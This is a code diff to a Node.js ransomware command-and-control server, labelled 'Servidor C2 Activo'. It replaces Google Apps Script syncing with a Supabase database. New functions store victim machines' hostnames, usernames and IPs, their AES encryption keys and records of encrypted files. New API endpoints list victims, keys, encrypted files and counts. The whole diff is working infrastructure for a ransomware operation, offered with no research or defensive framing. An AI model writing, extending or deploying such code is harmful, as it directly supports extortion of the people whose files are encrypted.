@@ -7,6 +7,15 @@ const fs = require('fs');
 const crypto = require('crypto');
 const readline = require('readline');
 
+// Load environment variables
+require('dotenv').config();
+
+// Supabase client
+const { createClient } = require('@supabase/supabase-js');
+const supabase = process.env.SUPABASE_URL && process.env.SUPABASE_KEY
+  ? createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY)
+  : null;
+
 // Global RL interface
 global.rl = null;
 
@@ -56,43 +65,81 @@ if (!fs.existsSync(KEYS_DIR)) {
 }
 
 // ===============================
-// CLOUD PERSISTENCE (Google Apps Script)
+// DATABASE PERSISTENCE (Supabase)
 // ===============================
-const GOOGLE_SCRIPT_URL = process.env.GOOGLE_SCRIPT_URL; // Set in Render ENV
 
-async function syncToCloud(type, payload) {
-  if (!GOOGLE_SCRIPT_URL) return;
-
+// Save victim to database
+async function saveVictim(data) {
+  if (!supabase) return;
   try {
-    const data = JSON.stringify({ type, payload });
-    const u = new URL(GOOGLE_SCRIPT_URL);
-
-    const req = require('https').request({
-      hostname: u.hostname,
-      path: u.pathname + u.search,
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Content-Length': data.length
-      }
-    }, (res) => {
-      let responseBody = '';
-      res.on('data', (chunk) => { responseBody += chunk; });
-      res.on('end', () => {
-        if (res.statusCode !== 200 && res.statusCode !== 302) {
-          console.log(`[Cloud Sync Warning] Type: ${type}, Status: ${res.statusCode}, Resp: ${responseBody}`);
-        } else {
-          // console.log(`[Cloud Sync Success] Type: ${type}`); // Uncomment for verbose
-        }
-      });
-    });
-
-    req.on('error', (e) => console.log(`[Cloud Sync Error] ${e.message}`));
-    req.write(data);
-    req.end();
+    const { error } = await supabase.from('victims').upsert({
+      uuid: data.uuid,
+      socket_id: data.socketId,
+      hostname: data.hostname,
+      username: data.username,
+      ip: data.ip,
+      platform: data.platform,
+      arch: data.arch,
+      status: data.status || 'connected'
+    }, { onConflict: 'uuid' });
+    if (error) console.log(`[DB Error] victims: ${error.message}`);
   } catch (e) {
-    console.log(`[Cloud Sync Failed] ${e.message}`);
+    console.log(`[DB Failed] victims: ${e.message}`);
   }
+}
+
+// Save encryption key to database
+async function saveKey(data) {
+  if (!supabase) return;
+  try {
+    const { error } = await supabase.from('keys').insert({
+      uuid: data.uuid,
+      socket_id: data.socketId,
+      hostname: data.hostname,
+      aes_key: data.aesKey
+    });
+    if (error && !error.message.includes('duplicate')) {
+      console.log(`[DB Error] keys: ${error.message}`);
+    }
+  } catch (e) {
+    console.log(`[DB Failed] keys: ${e.message}`);
+  }
+}
+
+// Save encrypted file to database
+async function saveEncryptedFile(data) {
+  if (!supabase) return;
+  try {
+    const { error } = await supabase.from('encrypted_files').insert({
+      uuid: data.uuid,
+      hostname: data.hostname,
+      file_name: data.archivo,
+      original_name: data.archivoOriginal,
+      directory: data.directorio,
+      iv: data.iv,
+      aes_key: data.aesKey
+    });
+    if (error) console.log(`[DB Error] encrypted: ${error.message}`);
+  } catch (e) {
+    console.log(`[DB Failed] encrypted: ${e.message}`);
+  }
+}
+
+// Update victim status
+async function updateVictimStatus(uuid, status) {
+  if (!supabase) return;
+  try {
+    await supabase.from('victims').update({ status }).eq('uuid', uuid);
+  } catch (e) {
+    console.log(`[DB Failed] update status: ${e.message}`);
+  }
+}
+
+// Legacy sync function (redirects to new functions)
+async function syncToCloud(type, payload) {
+  if (type === 'Victims') return saveVictim(payload);
+  if (type === 'Keys') return saveKey(payload);
+  if (type === 'Encrypted') return saveEncryptedFile(payload);
 }
 
 // ===============================
@@ -259,8 +306,89 @@ app.get('/api/status', (req, res) => {
     status: 'online',
     uptime: process.uptime(),
     clients: clientesConectados.size,
-    mensaje: 'Servidor C2 Activo'
+    mensaje: 'Servidor C2 Activo',
+    supabase: !!supabase
   });
+});
+
+// ===============================
+// DATABASE QUERY ENDPOINTS
+// ===============================
+
+// Get all victims from database
+app.get('/api/db/victims', async (req, res) => {
+  if (!supabase) {
+    return res.json({ success: false, error: 'Supabase not configured', data: [] });
+  }
+  try {
+    const { data, error } = await supabase
+      .from('victims')
+      .select('*')
+      .order('created_at', { ascending: false })
+      .limit(100);
+    if (error) throw error;
+    res.json({ success: true, data });
+  } catch (e) {
+    res.json({ success: false, error: e.message, data: [] });
+  }
+});
+
+// Get all keys from database
+app.get('/api/db/keys', async (req, res) => {
+  if (!supabase) {
+    return res.json({ success: false, error: 'Supabase not configured', data: [] });
+  }
+  try {
+    const { data, error } = await supabase
+      .from('keys')
+      .select('*')
+      .order('created_at', { ascending: false })
+      .limit(100);
+    if (error) throw error;
+    res.json({ success: true, data });
+  } catch (e) {
+    res.json({ success: false, error: e.message, data: [] });
+  }
+});
+
+// Get all encrypted files from database
+app.get('/api/db/encrypted', async (req, res) => {
+  if (!supabase) {
+    return res.json({ success: false, error: 'Supabase not configured', data: [] });
+  }
+  try {
+    const { data, error } = await supabase
+      .from('encrypted_files')
+      .select('*')
+      .order('created_at', { ascending: false })
+      .limit(200);
+    if (error) throw error;
+    res.json({ success: true, data });
+  } catch (e) {
+    res.json({ success: false, error: e.message, data: [] });
+  }
+});
+
+// Get stats summary
+app.get('/api/db/stats', async (req, res) => {
+  if (!supabase) {
+    return res.json({ success: false, victims: 0, keys: 0, encrypted: 0 });
+  }
+  try {
+    const [v, k, e] = await Promise.all([
+      supabase.from('victims').select('id', { count: 'exact', head: true }),
+      supabase.from('keys').select('id', { count: 'exact', head: true }),
+      supabase.from('encrypted_files').select('id', { count: 'exact', head: true })
+    ]);
+    res.json({
+      success: true,
+      victims: v.count || 0,
+      keys: k.count || 0,
+      encrypted: e.count || 0
+    });
+  } catch (e) {
+    res.json({ success: false, victims: 0, keys: 0, encrypted: 0 });
+  }
 });
 
 // Ruta POST para apagar el servidor
